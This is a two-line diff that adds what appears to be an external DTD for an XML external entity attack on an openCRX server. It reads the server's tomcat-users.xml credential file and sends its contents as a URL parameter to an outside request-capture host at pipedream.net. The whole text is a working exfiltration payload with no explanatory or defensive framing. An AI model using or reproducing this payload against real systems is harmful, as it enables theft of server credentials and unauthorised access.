@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///home/opencrx/opt/opencrx/installer/files/tomcat-users.xml">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'https://en2celr7rewbul.m.pipedream.net/?a=%d;'>" >
